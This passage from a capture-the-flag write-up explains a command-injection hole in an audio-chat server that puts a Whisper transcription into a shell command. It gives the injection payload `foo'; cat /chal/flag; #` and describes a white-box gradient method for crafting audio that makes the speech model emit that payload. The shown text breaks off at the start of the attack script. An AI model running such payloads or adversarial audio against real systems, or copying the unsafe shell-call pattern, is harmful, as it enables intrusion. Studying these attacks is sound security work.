</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=15><a style=outline:none;text-decoration:none;color:inherit href=#15>15</a></span><span>[<span style=color:#ff79c6>...</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=16><a style=outline:none;text-decoration:none;color:inherit href=#16>16</a></span><span>            chatbot_proc <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>await</span> asyncio<span style=color:#ff79c6>.</span>create_subprocess_shell(
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=17><a style=outline:none;text-decoration:none;color:inherit href=#17>17</a></span><span>                <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;python3 chatbot.py &#39;</span><span style=color:#f1fa8c>{</span>transcription<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39;&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=18><a style=outline:none;text-decoration:none;color:inherit href=#18>18</a></span><span>                stdout<span style=color:#ff79c6>=</span>asyncio<span style=color:#ff79c6>.</span>subprocess<span style=color:#ff79c6>.</span>PIPE,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=19><a style=outline:none;text-decoration:none;color:inherit href=#19>19</a></span><span>                stderr<span style=color:#ff79c6>=</span>asyncio<span style=color:#ff79c6>.</span>subprocess<span style=color:#ff79c6>.</span>STDOUT
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=20><a style=outline:none;text-decoration:none;color:inherit href=#20>20</a></span><span>            )
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=21><a style=outline:none;text-decoration:none;color:inherit href=#21>21</a></span><span>[<span style=color:#ff79c6>...</span>]</span></span></code></pre></div></div><div class=full style=display:none><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=1><a style=outline:none;text-decoration:none;color:inherit href=#1> 1</a></span><span>@app.post(<span style=color:#f1fa8c>&#34;/api/audio-chat&#34;</span>)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=2><a style=outline:none;text-decoration:none;color:inherit href=#2> 2</a></span><span><span style=color:#ff79c6>async</span> <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>audio_response</span>(audio: UploadFile <span style=color:#ff79c6>=</span> File(<span style=color:#ff79c6>...</span>)):
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=3><a style=outline:none;text-decoration:none;color:inherit href=#3> 3</a></span><span>    <span style=color:#ff79c6>try</span>:
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=4><a style=outline:none;text-decoration:none;color:inherit href=#4> 4</a></span><span>        <span style=color:#6272a4># Validate audio file</span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=5><a style=outline:none;text-decoration:none;color:inherit href=#5> 5</a></span><span>        is_valid, audio_file_path <span style=color:#ff79c6>=</span> is_valid_audio_file(audio)
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=6><a style=outline:none;text-decoration:none;color:inherit href=#6> 6</a></span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> is_valid:
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=7><a style=outline:none;text-decoration:none;color:inherit href=#7> 7</a></span><span>            <span style=color:#ff79c6>return</span> JSONResponse(content<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#34;error&#34;</span>: <span style=color:#f1fa8c>&#34;Invalid audio file.&#34;</span>}, status_code<span style=color:#ff79c6>=</span><span style=color:#bd93f9>400</span>)
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=8><a style=outline:none;text-decoration:none;color:inherit href=#8> 8</a></span><span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=9><a style=outline:none;text-decoration:none;color:inherit href=#9> 9</a></span><span>        <span style=color:#ff79c6>try</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=10><a style=outline:none;text-decoration:none;color:inherit href=#10>10</a></span><span>            result <span style=color:#ff79c6>=</span> subprocess<span style=color:#ff79c6>.</span>run(
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=11><a style=outline:none;text-decoration:none;color:inherit href=#11>11</a></span><span>                [
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=12><a style=outline:none;text-decoration:none;color:inherit href=#12>12</a></span><span>                    <span style=color:#f1fa8c>&#34;python3&#34;</span>, <span style=color:#f1fa8c>&#34;whisper.py&#34;</span>, <span style=color:#f1fa8c>&#34;--model&#34;</span>, <span style=color:#f1fa8c>&#34;tiny.en&#34;</span>, audio_file_path,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=13><a style=outline:none;text-decoration:none;color:inherit href=#13>13</a></span><span>                    <span style=color:#f1fa8c>&#34;--language&#34;</span>, <span style=color:#f1fa8c>&#34;English&#34;</span>, <span style=color:#f1fa8c>&#34;--best_of&#34;</span>, <span style=color:#f1fa8c>&#34;5&#34;</span>, <span style=color:#f1fa8c>&#34;--beam_size&#34;</span>, <span style=color:#f1fa8c>&#34;None&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=14><a style=outline:none;text-decoration:none;color:inherit href=#14>14</a></span><span>                ],
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=15><a style=outline:none;text-decoration:none;color:inherit href=#15>15</a></span><span>                stdout<span style=color:#ff79c6>=</span>subprocess<span style=color:#ff79c6>.</span>PIPE,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=16><a style=outline:none;text-decoration:none;color:inherit href=#16>16</a></span><span>                stderr<span style=color:#ff79c6>=</span>subprocess<span style=color:#ff79c6>.</span>PIPE,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=17><a style=outline:none;text-decoration:none;color:inherit href=#17>17</a></span><span>                text<span style=color:#ff79c6>=</span><span style=color:#ff79c6>True</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=18><a style=outline:none;text-decoration:none;color:inherit href=#18>18</a></span><span>            )
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=19><a style=outline:none;text-decoration:none;color:inherit href=#19>19</a></span><span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=20><a style=outline:none;text-decoration:none;color:inherit href=#20>20</a></span><span>            <span style=color:#6272a4># Check for errors</span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=21><a style=outline:none;text-decoration:none;color:inherit href=#21>21</a></span><span>            <span style=color:#ff79c6>if</span> result<span style=color:#ff79c6>.</span>returncode <span style=color:#ff79c6>!=</span> <span style=color:#bd93f9>0</span>:
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=22><a style=outline:none;text-decoration:none;color:inherit href=#22>22</a></span><span>                <span style=color:#ff79c6>return</span> JSONResponse(content<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#34;error&#34;</span>: <span style=color:#f1fa8c>&#34;Error processing audio file.&#34;</span>}, status_code<span style=color:#ff79c6>=</span><span style=color:#bd93f9>500</span>)
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=23><a style=outline:none;text-decoration:none;color:inherit href=#23>23</a></span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=24><a style=outline:none;text-decoration:none;color:inherit href=#24>24</a></span><span>            transcription <span style=color:#ff79c6>=</span> result<span style=color:#ff79c6>.</span>stdout<span style=color:#ff79c6>.</span>strip()
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=25><a style=outline:none;text-decoration:none;color:inherit href=#25>25</a></span><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> transcription:
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=26><a style=outline:none;text-decoration:none;color:inherit href=#26>26</a></span><span>                <span style=color:#ff79c6>return</span> JSONResponse(content<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#34;error&#34;</span>: <span style=color:#f1fa8c>&#34;No transcription generated.&#34;</span>}, status_code<span style=color:#ff79c6>=</span><span style=color:#bd93f9>400</span>)
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=27><a style=outline:none;text-decoration:none;color:inherit href=#27>27</a></span><span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=28><a style=outline:none;text-decoration:none;color:inherit href=#28>28</a></span><span>            <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;Transcription&#34;</span>,transcription)
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=29><a style=outline:none;text-decoration:none;color:inherit href=#29>29</a></span><span>            chatbot_proc <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>await</span> asyncio<span style=color:#ff79c6>.</span>create_subprocess_shell(
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=30><a style=outline:none;text-decoration:none;color:inherit href=#30>30</a></span><span>                <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;python3 chatbot.py &#39;</span><span style=color:#f1fa8c>{</span>transcription<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39;&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=31><a style=outline:none;text-decoration:none;color:inherit href=#31>31</a></span><span>                stdout<span style=color:#ff79c6>=</span>asyncio<span style=color:#ff79c6>.</span>subprocess<span style=color:#ff79c6>.</span>PIPE,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=32><a style=outline:none;text-decoration:none;color:inherit href=#32>32</a></span><span>                stderr<span style=color:#ff79c6>=</span>asyncio<span style=color:#ff79c6>.</span>subprocess<span style=color:#ff79c6>.</span>STDOUT
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=33><a style=outline:none;text-decoration:none;color:inherit href=#33>33</a></span><span>            )
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=34><a style=outline:none;text-decoration:none;color:inherit href=#34>34</a></span><span>            chatbot_stdout, chatbot_stderr <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>await</span> chatbot_proc<span style=color:#ff79c6>.</span>communicate()
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=35><a style=outline:none;text-decoration:none;color:inherit href=#35>35</a></span><span>            <span style=color:#ff79c6>return</span> JSONResponse(content<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#34;response&#34;</span>: chatbot_stdout<span style=color:#ff79c6>.</span>decode()<span style=color:#ff79c6>.</span>strip(), <span style=color:#f1fa8c>&#34;transcription&#34;</span>: transcription})
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=36><a style=outline:none;text-decoration:none;color:inherit href=#36>36</a></span><span>        <span style=color:#ff79c6>finally</span>:
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=37><a style=outline:none;text-decoration:none;color:inherit href=#37>37</a></span><span>            <span style=color:#6272a4># Clean up temporary file</span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=38><a style=outline:none;text-decoration:none;color:inherit href=#38>38</a></span><span>            <span style=color:#ff79c6>if</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>exists(audio_file_path):
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=39><a style=outline:none;text-decoration:none;color:inherit href=#39>39</a></span><span>                os<span style=color:#ff79c6>.</span>remove(audio_file_path)
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=40><a style=outline:none;text-decoration:none;color:inherit href=#40>40</a></span><span>
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=41><a style=outline:none;text-decoration:none;color:inherit href=#41>41</a></span><span>    <span style=color:#ff79c6>except</span> HTTPException <span style=color:#ff79c6>as</span> e:
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=42><a style=outline:none;text-decoration:none;color:inherit href=#42>42</a></span><span>        <span style=color:#ff79c6>return</span> JSONResponse(content<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#34;error&#34;</span>: e<span style=color:#ff79c6>.</span>detail}, status_code<span style=color:#ff79c6>=</span>e<span style=color:#ff79c6>.</span>status_code)
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=43><a style=outline:none;text-decoration:none;color:inherit href=#43>43</a></span><span>    <span style=color:#ff79c6>except</span> Exception:
</span></span><span style=display:flex;background-color:#3d3f4a><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=44><a style=outline:none;text-decoration:none;color:inherit href=#44>44</a></span><span>        <span style=color:#ff79c6>return</span> JSONResponse(content<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#34;error&#34;</span>: <span style=color:#f1fa8c>&#34;An unexpected error occurred.&#34;</span>}, status_code<span style=color:#ff79c6>=</span><span style=color:#bd93f9>500</span>)</span></span></code></pre></div></div><div class=highlight-link><a href style=text-decoration:none data-expand-text="Click here to expand">Click here to expand</a></div></div></li></ul><p>Here, any single quote in <code>transcription</code> breaks out of the intended argument, opening the door to command injection.</p><h2 id=3-crafting-the-injection-payload>3. Crafting the Injection Payload</h2><p>By closing the quote, injecting our command, and using a shell comment (<code>#</code>), we can execute arbitrary commands. For example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1>1</a></span><span><span style=color:#8be9fd;font-style:italic>payload</span> <span style=color:#ff79c6>=</span> foo<span style=color:#f1fa8c>&#39;; cat /chal/flag; #
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2>2</a></span><span><span style=color:#f1fa8c># Execution becomes:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3>3</a></span><span><span style=color:#f1fa8c>python3 chatbot.py &#39;</span>foo<span style=color:#f1fa8c>&#39;; cat /chal/flag; #&#39;</span>  
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4>4</a></span><span><span style=color:#6272a4># This prints the flag and ignores the trailing `&#39;`</span>
</span></span></code></pre></div><p>Since the service also returns the full transcription, which is actually the <code>stdout</code> of the above command, we can directly read the flag.. if we are able to actually inject a command.</p><p>Now our challenge becomes:
How can we generate an audio file that Whisper would reliably transcribe into our desired payload?</p><p>Well, what if we just <em>say</em> the command line injection?
Let&rsquo;s try using TTS to say the CLI and just transcribe that!</p><p>We create a TTS audio file where it says <code>'; cat chal/flag; #</code>:
<audio controls><source src=../../posts/bi0s2025_dontwhisper/tts.mp3 type>Your browser does not support the audio element.</audio></p><p>And transcribe it with whisper:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a></span><span>Single quote semicolon cat chow slash flag sem
</span></span></code></pre></div><p>Oh, no!
It seems like Whisper will transcribe to words, but not to the special characters we want.
Which makes sense, as it&rsquo;s trained on human speech,
and we typically don&rsquo;t spell out command line injections in our utterances.</p><p>We will have to take a more advanced approach.</p><h2 id=4-understanding-whisper-and-asr-models-high-level-primer>4. Understanding Whisper and ASR Models (High-Level Primer)</h2><p>Modern ASR systems like Whisper transform raw audio into text in three main stages.
The most important part for us is
that the entire process is <a href=https://en.wikipedia.org/wiki/Differentiable_function><em>differentiable</em></a>,
this will allow us to easily optimize our input when trying to craft a malicious file later on.
If you are interested, here is a quick overview of how Whisper transcribes audio to text:</p><ol><li><strong>Feature Extraction → Log-Mel Spectrogram</strong>
The continuous waveform is first segmented into short, overlapping frames. Each frame is converted via a Short-Time Fourier Transform (STFT) into a power spectrum, then re-mapped onto the mel scale (which approximates human pitch perception) and finally converted to log amplitude. The result is an 80-band time–frequency “image” that highlights the perceptually relevant spectral features of speech.
<em>See: <a href=https://en.wikipedia.org/wiki/Spectrogram>Spectrogram</a></em></li></ol><p>After transforming the Audio, it is fed into the encoding model, which encodes it into an embedding, in the case of whisper this is:</p><ol start=2><li><strong>Encoder: Convolution + Transformer</strong><ul><li><strong>Convolutional front-end</strong> 1D convolutions downsample the spectrogram in time and capture local frequency–time patterns (e.g. formant structure).</li><li><strong>Transformer layers</strong> (self-attention + feedforward) build contextual embeddings over long-range dependencies.<br><em>See: <a href=https://en.wikipedia.org/wiki/Transformer_(machine_learning_model)>Transformer</a></em></li></ul></li></ol><p>Using the generated embeddings, in the last step of the Whisper model, a decoder tries to map it to textual output:</p><ol start=3><li><strong>Decoder: Autoregressive Token Generation</strong><br>Given the encoder&rsquo;s embeddings and any tokens already produced, the decoder predicts the next token&rsquo;s probabilities over a fixed vocabulary. Standard Whisper employs beam search (exploring multiple high-probability token sequences) and “temperature”-based fallbacks (to avoid repetition and low-confidence outputs), guided by thresholds on compression ratios and log-probabilities.</li></ol><p>It&rsquo;s important to note that the challenge authors stripped out beam search and fallback logic.
Instead,
decoding is limited to a small fixed number of steps (≈12) and each new token is chosen by a simple greedy argmax.
This greatly simplifies the search, allowing us to more easily attack the model.
It also removes a lot of randomness (called &ldquo;temperature&rdquo;),
making any malicious file we craft very consistent in the transcriptions it generates.</p><p>If the code was unchanged, our chosen approach would still work, but require more compute time.</p><h2 id=5-whitebox-adversarial-attack-strategy>5. White‑Box Adversarial Attack Strategy</h2><p>Because we have full access to the exact Whisper code and model weights, we&rsquo;re in a classic <strong>white-box</strong> setting. This lets us craft inputs by backpropagating gradients all the way to the raw audio samples, an approach pioneered in works like <a href=https://arxiv.org/abs/1801.01944>Carlini & Wagner 2018</a>.</p><h3 id=attack-workflow>Attack Workflow</h3><ol><li><p><strong>Specify the target token sequence</strong>
We encode our injection payload (e.g. <code>foo' ; cat /chal/flag #</code>) into Whisper&rsquo;s vocabulary IDs, enclosing it between the special <strong>start-of-transcript</strong> (SOT) and <strong>end-of-text</strong> (EOT) tokens.</p></li><li><p><strong>Initialize a seed waveform</strong>
Start from 5 seconds of small-amplitude Gaussian noise (or innocuous TTS output/music),
represented as a PyTorch tensor with <code>requires_grad=True</code>.</p><p>We will use the following innocuous sounding audio file as our seed waveform:
<audio controls><source src=../../posts/bi0s2025_dontwhisper/rickroll.mp3 type>Your browser does not support the audio element.
</audio>Which gets transcribed to:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1>1</a></span><span>(upbeat music)
</span></span></code></pre></div></li><li><p><strong>Forward pass (teacher-forcing)</strong></p><ul><li>Compute the log-Mel spectrogram of the current waveform.</li><li>Run it through Whisper&rsquo;s encoder to obtain audio embeddings.</li><li>Feed these embeddings and our <strong>prefix</strong> tokens into the decoder to produce logits for each next-token prediction.</li></ul></li><li><p><strong>Loss calculation</strong>
Use <strong>cross-entropy</strong> between the decoder&rsquo;s logits and our target token IDs. This loss quantifies how “off” the model&rsquo;s predictions are from our desired phrase.</p></li><li><p><strong>Backward pass & waveform update</strong>
Backpropagate the loss to compute gradients w.r.t. the waveform.
Apply an <strong>Adam</strong> optimizer step to nudge the audio samples toward reducing the loss, then <strong>clamp</strong> the waveform to stay within valid amplitude bounds (e.g. [–1,1]).</p></li><li><p><strong>Periodic transcription check</strong>
Every N iterations, decode the current waveform with our <strong>patched “greedy argmax”</strong> loop (mimicking the CTF&rsquo;s 12-token, beamless decoder). If the transcription now contains a leading apostrophe, our <code>; cat /chal/flag</code> sequence, and a trailing <code>#</code> or <code>'</code>, we declare success and stop.</p></li></ol><hr><p>By iterating this Workflow over multiple gradient-descent steps, we gradually sculpt the noise waveform into one that Whisper reliably outputs as our injection phrase, even if the model never saw such samples in its training data.</p><h2 id=6-attack-implementation>6. Attack Implementation</h2><p>Below is the complete <code>whitebox_adversarial_whisper.py</code> script implementing the attack. Key sections are commented inline.</p><script type=text/javascript>function toggle(e){e.preventDefault();var t=e.target,n=t.closest(".highlight-wrapper");t.innerHTML.includes("expand")||t.innerHTML.includes("show entire code")?(t.innerHTML="Click here to collapse",n.querySelector(".preview").style.display="none",n.querySelector(".full").style.display="block"):(t.innerHTML=t.dataset.expandText,n.querySelector(".preview").style.display="block",n.querySelector(".full").style.display="none")}document.addEventListener("DOMContentLoaded",function(){var e=document.querySelectorAll(".highlight-link a");e.forEach(function(e){e.addEventListener("click",toggle)})})</script><div class=highlight-wrapper><div class=highlight-before></div><div class=preview style=max-height:260px;overflow:clip><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=1><a style=outline:none;text-decoration:none;color:inherit href=#1> 1</a></span><span><span style=color:#6272a4>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=2><a style=outline:none;text-decoration:none;color:inherit href=#2> 2</a></span><span><span style=color:#f1fa8c>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=3><a style=outline:none;text-decoration:none;color:inherit href=#3> 3</a></span><span><span style=color:#f1fa8c>whitebox_adversarial_whisper.py
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=4><a style=outline:none;text-decoration:none;color:inherit href=#4> 4</a></span><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=5><a style=outline:none;text-decoration:none;color:inherit href=#5> 5</a></span><span><span style=color:#f1fa8c>Adversarial audio attack on the patched Whisper-20231117 tiny.en model.
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=6><a style=outline:none;text-decoration:none;color:inherit href=#6> 6</a></span><span><span style=color:#f1fa8c>Generates an audio file that, when run through the exact same CLI:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=7><a style=outline:none;text-decoration:none;color:inherit href=#7> 7</a></span><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=8><a style=outline:none;text-decoration:none;color:inherit href=#8> 8</a></span><span><span style=color:#f1fa8c>    python3 whisper.py --model tiny.en --language English --best_of 5 --beam_size None exploit.wav
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=9><a style=outline:none;text-decoration:none;color:inherit href=#9> 9</a></span><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=10><a style=outline:none;text-decoration:none;color:inherit href=#10>10</a></span><span><span style=color:#f1fa8c>will produce a transcript containing:
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=11><a style=outline:none;text-decoration:none;color:inherit href=#11>11</a></span><span><span style=color:#f1fa8c>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=12><a style=outline:none;text-decoration:none;color:inherit href=#12>12</a></span><span><span style=color:#f1fa8c>  • at least one apostrophe (&#39;)  
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=13><a style=outline:none;text-decoration:none;color:inherit href=#13>13</a></span><span><span style=color:#f1fa8c>  • the substring &#34;; cat /chal/flag &#34;  
